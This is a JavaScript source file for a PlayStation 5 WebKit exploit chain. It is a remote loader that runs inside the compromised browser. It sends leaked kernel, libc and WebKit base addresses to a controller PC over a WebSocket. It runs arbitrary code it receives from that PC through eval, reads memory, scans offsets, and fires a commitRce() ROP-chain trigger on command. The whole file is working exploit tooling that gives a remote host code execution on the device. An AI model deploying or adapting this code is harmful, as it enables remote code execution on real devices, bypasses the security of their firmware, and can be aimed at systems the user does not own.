/**
 * remote.js — Remote JS Loader for PS5 (WebKit exploit)
 *
 * Compatible with Y2JB payload format:
 *   await log("message")         → mark() in exploit logs
 *   send_notification("text")    → asks ws_server to trigger commitRce()
 *
 * ws_server.py commands:
 *   send <file.js>   → send a payload
 *   fire             → trigger PS5 notification via ROP chain (crashes renderer)
 *   help             → help
 *
 * Namespace resolution:
 *   Reads from window._ds (modular boot) with fallback to bare globals
 *   (legacy exploit.js boot). Works in both modes.
 */

(async function remoteJSLoader() {

    // ── Resolve from modular namespace or legacy globals ─────────────────────
    var _ds = window._ds || {};
    var _c  = _ds.c || {};
    var _s  = _ds.s || {};

    var PC_IP = (function () {
        // Modular: _ds.c.RCE_PC_IP is an array [192,168,1,180]
        if (_c.RCE_PC_IP && _c.RCE_PC_IP.join) return _c.RCE_PC_IP.join(".");
        // Legacy: bare global
        if (typeof RCE_PC_IP !== "undefined" && RCE_PC_IP && RCE_PC_IP.join)
            return RCE_PC_IP.join(".");
        return "192.168.1.180";
    })();

    var WS_PORT = _c.RCE_PORT || (typeof RCE_PORT !== "undefined" ? RCE_PORT : 50000);
    var WS_URL  = "ws://" + PC_IP + ":" + WS_PORT;

    // ── System info ─────────────────────────────────────────────────────────
    function resolveBase(name, dsField, globalName) {
        var v = dsField;
        if (v === undefined || v !== v) { // NaN check
            if (typeof window[globalName] !== "undefined") v = window[globalName];
        }
        if (v !== undefined && v === v && typeof v === "number")
            return "0x" + v.toString(16);
        return "?";
    }

    var fwLabel = _c.FW_LABEL
        || (typeof FW_LABEL !== "undefined" ? FW_LABEL : "?");

    var sysInfo = {
        fw:         fwLabel,
        kernelBase: resolveBase("kernelBase", _s.kernelBase, "kernelBase"),
        libcBase:   resolveBase("libcBase",   _s.libcBase,   "libcBase"),
        webkitBase: resolveBase("webkitBase", _s.webkitBase, "webkitBase"),
    };

    // ── Logging ─────────────────────────────────────────────────────────────
    // mark() may be on window._ds or as a bare global (legacy)
    var _mark = (_ds && typeof _ds.mark === "function") ? _ds.mark
        : (typeof mark === "function" ? mark : function () {});

    function rlog(msg) {
        _mark("RJL", msg);
        console.log("[RemoteJS] " + msg);
    }

    // log() — payload-facing, matches Y2JB shape
    if (typeof window.log !== "function") {
        window.log = function (msg) {
            rlog(msg);
            return Promise.resolve();
        };
    }

    // send_notification() — payload-facing
    if (typeof window.send_notification !== "function") {
        window.send_notification = function (text) {
            rlog("send_notification: " + text);
            // Attempt via _ds kernel if available
            if (_ds && typeof _ds.sendNotification === "function") {
                try { _ds.sendNotification(text); return; } catch (e) {}
            }
            // Attempt via bare global
            if (typeof sendNotifNatural === "function") {
                try { sendNotifNatural(text); return; } catch (e) {}
            }
        };
    }

    rlog("Connecting to " + WS_URL + " ...");

    var ws = null;
    var reconnectTimer = null;

    function connectWS() {
        if (ws) { try { ws.close(); } catch (e) {} }

        ws = new WebSocket(WS_URL);

        ws.onopen = function () {
            rlog("Connected to " + WS_URL);
            ws.send(JSON.stringify({ type: "ready", fw: sysInfo.fw,
                kernelBase: sysInfo.kernelBase, webkitBase: sysInfo.webkitBase,
                libcBase: sysInfo.libcBase }));
        };

        ws.onmessage = async function (event) {
            var msg;
            try {
                msg = typeof event.data === "string"
                    ? event.data : await event.data.text();
            } catch (e) {
                try { ws.send(JSON.stringify({
                    type: "error", error: "Failed to read: " + String(e)
                })); } catch (e2) {}
                return;
            }

            var parsed;
            try { parsed = JSON.parse(msg); }
            catch (e) { parsed = { type: "eval", code: msg }; }

            // ── fire / commit ───────────────────────────────────────────────
            if (parsed.type === "commit" || parsed.type === "fire") {
                rlog("commitRce() triggered from ws_server");
                try { ws.send(JSON.stringify({
                    type: "result", status: "ok",
                    value: "commitRce firing..."
                })); } catch (e) {}
                setTimeout(function () {
                    // Modular: _ds.commitRce or bare global
                    var fn = (_ds && typeof _ds.commitRce === "function")
                        ? _ds.commitRce
                        : (typeof commitRce === "function" ? commitRce : null);
                    if (fn) { fn(); }
                    else { rlog("ERROR: commitRce() inaccessible"); }
                }, 100);
                return;
            }

            // ── eval / js ───────────────────────────────────────────────────
            if (parsed.type === "eval" || parsed.type === "js") {
                var code = parsed.code || msg;
                rlog("Executing (" + code.length + " bytes)");
                try {
                    var result = await eval(code);
                    try { ws.send(JSON.stringify({
                        type: "result", status: "ok",
                        value: result !== undefined ? String(result) : "undefined"
                    })); } catch (e) {}
                } catch (e) {
                    try { ws.send(JSON.stringify({
                        type: "result", status: "error",
                        error: String(e)
                    })); } catch (e2) {}
                    rlog("Error: " + String(e).slice(0, 80));
                }
            }

            // ── ping ────────────────────────────────────────────────────────
            else if (parsed.type === "ping") {
                try { ws.send(JSON.stringify({ type: "pong" })); } catch (e) {}
            }

            // ── offsets / scan ──────────────────────────────────────────────
            else if (parsed.type === "offsets" || parsed.type === "scan") {
                var scan = (typeof window.deepslopScanOffsets === "function")
                    ? window.deepslopScanOffsets() : null;
                var info = (typeof window.deepslopInfo !== "undefined")
                    ? window.deepslopInfo : null;
                try { ws.send(JSON.stringify({
                    type: "result", status: "ok",
                    value: JSON.stringify({ info: info, scan: scan })
                })); } catch (e) {}
            }

            // ── resolve <addr> ──────────────────────────────────────────────
            else if (parsed.type === "resolve") {
                var out = "?", ok = true;
                try {
                    var a = Number(parsed.addr);
                    var dsInfo = window.deepslopInfo
                        || { kernelBase: _s.kernelBase, webkitBase: _s.webkitBase };
                    if (dsInfo && Number.isFinite(a)) {
                        var kb = Number(dsInfo.kernelBase);
                        var wb = Number(dsInfo.webkitBase);
                        if (a >= kb && a < kb + 0x44000)
                            out = "libkernel_web+0x" + (a - kb).toString(16);
                        else if (a >= wb && a < wb + 0x2c7c000)
                            out = "libSceNKWebKit+0x" + (a - wb).toString(16);
                        else
                            out = "0x" + a.toString(16);
                    }
                } catch (e) { out = "error: " + String(e); ok = false; }
                try { ws.send(JSON.stringify({
                    type: "result",
                    status: ok ? "ok" : "error",
                    value: out
                })); } catch (e) {}
            }

            // ── mem <addr> [qwords] ─────────────────────────────────────────
            else if (parsed.type === "mem") {
                var memOut = "", memOk = true;
                try {
                    var addr = BigInt(parsed.addr);
                    var n = Math.min(8, Math.max(1, parseInt(parsed.count || "1", 10) || 1));
                    for (var i = 0; i < n; i++) {
                        var cur = addr + BigInt(i * 8);
                        var v = 0n;
                        if (typeof window.read64 === "function") v = window.read64(cur);
                        memOut += "0x" + cur.toString(16) + " = 0x" + v.toString(16) + "\n";
                    }
                } catch (e) { memOut = "error: " + String(e); memOk = false; }
                try { ws.send(JSON.stringify({
                    type: "result",
                    status: memOk ? "ok" : "error",
                    value: memOut.trim()
                })); } catch (e) {}
            }

            // ── research (framework integration) ────────────────────────────
            else if (parsed.type === "research") {
                var resOut = { status: "error", error: "DSResearch not loaded" };
                try {
                    if (window.DSResearch) {
                        var cmd = parsed.command || "";
                        if (cmd === "list") {
                            resOut = { status: "ok", value: JSON.stringify(window.DSResearch.list()) };
                        } else if (cmd === "run" && parsed.name) {
                            var r = await window.DSResearch.run(parsed.name, parsed.opts || {});
                            resOut = { status: "ok", value: JSON.stringify(r) };
                        } else if (cmd === "run-all") {
                            var r2 = await window.DSResearch.runAll(parsed.category || null, parsed.opts || {});
                            resOut = { status: "ok", value: JSON.stringify(r2) };
                        } else if (cmd === "report") {
                            resOut = { status: "ok", value: window.DSResearch.exportJSON() };
                        } else if (cmd === "capabilities") {
                            resOut = { status: "ok", value: JSON.stringify(window.DSResearch.capabilities) };
                        } else {
                            resOut = { status: "error", error: "Unknown research command: " + cmd };
                        }
                    }
                } catch (e) {
                    resOut = { status: "error", error: String(e) };
                }
                try { ws.send(JSON.stringify(
                    Object.assign({ type: "result" }, resOut)
                )); } catch (e) {}
            }
        };

        ws.onerror = function () { rlog("WS error"); };

        ws.onclose = function () {
            rlog("WS closed — reconnecting in 3s");
            clearTimeout(reconnectTimer);
            reconnectTimer = setTimeout(connectWS, 3000);
        };
    }

    connectWS();

    // Block so commitRce() is never called automatically.
    // commitRce() is triggered manually via "fire" in ws_server.
    await new Promise(function () {});

})().catch(function (e) {
    var _mark2 = (window._ds && typeof window._ds.mark === "function")
        ? window._ds.mark
        : (typeof mark === "function" ? mark : function () {});
    _mark2("RJL-FATAL", String(e && e.message));
});
